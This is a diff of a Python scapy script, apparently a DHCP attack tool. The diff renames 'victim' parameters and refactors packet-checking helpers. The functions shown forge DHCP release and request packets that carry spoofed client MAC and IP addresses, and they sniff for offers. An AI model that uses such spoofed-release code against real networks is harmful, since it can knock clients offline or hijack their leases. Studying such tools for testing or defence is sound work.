@@ -30,6 +30,7 @@ class DHCP_ATTS:
 TODO make mac templates
 TODO verbose flag
 TODO option to write pcap
+TODO use python buit-in logger
 """
 
 
@@ -45,7 +46,7 @@ def random_transaction_id():
 
 def mac_to_binary(regular_mac : str):
     """
-    gets a mac, removes collons and turns it to binary representation
+    gets a string, removes collons and turns it to binary representation
     you need to give BOOTP the binary representation of mac in scapy cuz who knows
     """
     regular_mac = regular_mac.replace(':', '')
@@ -53,7 +54,7 @@ def mac_to_binary(regular_mac : str):
     return binascii.unhexlify(regular_mac)
 
 
-def dhcp_release(server_mac : str ,server_ip : str, victim_ip : str , victim_mac : str, victim_transaction_id : hex, interface : str = conf.iface):
+def dhcp_release(server_mac : str ,server_ip : str, ip : str , src_mac : str, transaction_id : hex, interface : str = conf.iface):
     """
     sends a DHCP release with the source and dest being the args through the arg interface
     """
@@ -63,31 +64,31 @@ def dhcp_release(server_mac : str ,server_ip : str, victim_ip : str , victim_mac
     dhcp_options= [('message-type','release'), ('server_id', server_ip),('end')]
 
 
-    releaseMyIp = Ether(dst=server_mac, src=victim_mac)\
-                    / IP(dst=server_ip,src=victim_ip,ttl=5)\
+    releaseMyIp = Ether(dst=server_mac, src=src_mac)\
+                    / IP(dst=server_ip,src=ip,ttl=5)\
                     / UDP(dport=67,sport=68)\
-                    / BOOTP(htype=1,op=1,chaddr=boop_mac(victim_mac), xid = victim_transaction_id, ciaddr = victim_ip, hops = 2)\
+                    / BOOTP(htype=1,op=1,chaddr=boop_mac(src_mac), xid = transaction_id, ciaddr = ip, hops = 2)\
                     / DHCP(options=dhcp_options)
     
     if(args.debug):
-        print(f"{function_name} : sending dhcp release from {victim_ip},{victim_mac} to {server_ip},{server_mac} via {interface}")
+        print(f"{function_name} : sending dhcp release from {ip},{src_mac} to {server_ip},{server_mac} via {interface}")
         
     sendp(releaseMyIp, iface=interface)
 
-def dhcp_request( victim_ip : str, device_mac : str, victim_transaction_id : hex, server_ip : str, interface : str = conf.iface):
+def dhcp_request( ip : str, device_mac : str, transaction_id : hex, server_ip : str, interface : str = conf.iface):
     """
     sends a DHCP request with the source being the args through the arg interface
     """
     function_name = inspect.currentframe().f_code.co_name
-    dhcp_options= [('message-type','request'), ('client_id', device_mac), ('requested_addr', victim_ip),('server_id', server_ip),('end')]
+    dhcp_options= [('message-type','request'), ('client_id', device_mac), ('requested_addr', ip),('server_id', server_ip),('end')]
     
     request_packet = Ether(dst=ETHER_BROADCAST, src=device_mac, type=ETHER_TYPES.IPv4)\
                     / IP(dst=IP_GLOBAL_BROADCAST,src='0.0.0.0',ttl=5)\
                     / UDP(dport=67,sport=68)\
-                    / BOOTP(htype=1,op=1,chaddr=mac_to_binary(device_mac), hops = 2, xid = victim_transaction_id)\
+                    / BOOTP(htype=1,op=1,chaddr=mac_to_binary(device_mac), hops = 2, xid = transaction_id)\
                     / DHCP(options=dhcp_options)
     if(args.debug):
-        print(f"{function_name} : sending dhcp request for {victim_ip} to {server_ip}, via {interface}")
+        print(f"{function_name} : sending dhcp request for {ip} to {server_ip}, via {interface}")
     sendp(request_packet, iface=interface)
 
 def dhcp_discover(src_mac : str, interface : str = conf.iface):
@@ -103,70 +104,108 @@ def dhcp_discover(src_mac : str, interface : str = conf.iface):
                         / DHCP(options=dhcp_options)
     sendp(discover_packet, iface=interface)   
 
+def is_bootp(packet)->bool:
+    """
+    checks if theres bootp
+    no other checking
+    """
+    function_name = inspect.currentframe().f_code.co_name
+
+    if(BOOTP not in packet):
+        if(args.debug):
+            print(f"{function_name} : packet not BOOTP [{packet}]")
+        return False
+
+    return True
+
+def is_dhcp(packet)->bool:
+    """
+    checks if theres bootp and dhcp
+    """
+    function_name = inspect.currentframe().f_code.co_name
+
+    if(is_bootp(packet) == False):
+        return False
+
+    if(DHCP not in packet):
+        if(args.debug):
+            print(f"{function_name} : packet not DHCP [{packet}]")
+        return False
+
+    return True
+
+def is_my_dhcp_offer(packet, my_mac : str)->bool:
+    
+    function_name = inspect.currentframe().f_code.co_name
+    
+    # to binary
+    my_mac = mac_to_binary(my_mac)
+
+    #there is both bootp and dhcp
+    if is_dhcp_offer(packet) == False:
+        return False
+    
+    return my_mac in packet[BOOTP].chaddr
+        
+
 def capture_my_dhcp_offer(dest_mac : str, server_mac : str, interface : str = conf.iface , result_list = None):
     """
-    TODO make a function for filtering and honoring debug flag
     Gets a MAC and server IP
     tries to Capture DHCP responses for the provided MAC
     """
     function_name = inspect.currentframe().f_code.co_name
 
-
     if (args.debug):
         print(f"{function_name} : sniffing on interface {interface}")
     
-
     res = sniff(count=1, filter = f"udp and ether src {server_mac}", timeout=4, iface=interface,\
-            lfilter= lambda packet : is_dhcp_offer(packet))
+            lfilter= lambda packet : is_my_dhcp_offer(packet, dest_mac))
 
-    if (args.debug):
-        print(f"{function_name} : captured {res}")
+    result_list[0] = res[0]
+
+    if (args.debug ):
+        if res is not None : print(f"{function_name} : captured {res}")
+        else : print(f"{function_name} : returning None")
     
-    #keep for debug flag
-    for packet in res:
-        if(is_for_my_mac(dest_mac, packet) and is_dhcp_offer(packet)):
-            result_list[0] = packet
-            if (args.debug):
-                print(f"{function_name} returning {packet}")
-            return packet
-
-    print(f"{function_name} : returning None")
     return None
     
 
 def is_dhcp_ack(packet)->bool:
-    if is_bootp_reply(packet) == False : 
+    
+    if(is_bootp_reply(packet) == False):
         return False
+    if(is_dhcp(packet) == False):
+        return False
+
     return is_dhcp_msg_type_eq(packet, DHCP_ATTS.MSGTYPE.ACK)
 
 def is_dhcp_offer( packet )->bool:
     """
-    message type of offer is 2
+    return is_bootp_reply(packet) and
+        is_dhcp_msg_type_eq(packet, DHCP_ATTS.MSGTYPE.OFFER) 
     """
-    if is_bootp_reply(packet) == False : 
-        return False
-    return is_dhcp_msg_type_eq(packet, DHCP_ATTS.MSGTYPE.OFFER)
+
+    return is_bootp_reply(packet) and\
+        is_dhcp_msg_type_eq(packet, DHCP_ATTS.MSGTYPE.OFFER) 
 
 def is_dhcp_msg_type_eq(packet, value : int )->bool:
-    """ 
+    """
+    Doesnt check if packet is dhcp the caller must do it 
     Returns true if message type field of dhcp pdu is equal to value
     """  
     function_name = inspect.currentframe().f_code.co_name
 
-    if (DHCP in packet) == False : 
-        if(args.debug):
-            print(f"{function_name} : {packet} is not DHCP")
-        return False
-
-    
-
     message_type_index = find_dhcp_option('message-type', packet[DHCP])
 
     #there is no message-type option in dhcp packet
-    if message_type_index == -1 : return False
+    if message_type_index == -1 : 
+        if(args.debug):
+            print(f"{function_name} : no message-type in [{packet}]")
+        return False
 
     if(args.debug):
             print(f"{function_name} : message-type in {message_type_index}th index of {packet}")
+
     return packet[DHCP].options[message_type_index][1] == value 
 
 def is_for_my_mac(mac : str, packet):
@@ -178,6 +217,7 @@ def is_for_my_mac(mac : str, packet):
 
 def find_dhcp_option(option : str, dhcp_pdu : scapy.layers.dhcp.DHCP):
     """
+    Doesnt check is pdu is dhcp
     Gets a DHCP PDU and a MAC
     Returns -1 if the DHCP PDU doesn't include the option
     """
@@ -192,13 +232,11 @@ def find_dhcp_option(option : str, dhcp_pdu : scapy.layers.dhcp.DHCP):
 
 def is_bootp_reply(packet)->bool:
     """
-    False if there not a BOOTP PDU in packet or is not a BOOTPREPLY
+    False if is_bootp() is False or is not a BOOTPREPLY
     """
     function_name = inspect.currentframe().f_code.co_name
 
-    if BOOTP not in packet: 
-        if(args.debug):
-            print(f"{function_name} : {packet} is not BOOTP_Reply")
+    if(is_bootp(packet) == False):
         return False
 
     #is a BOOTPREPLY
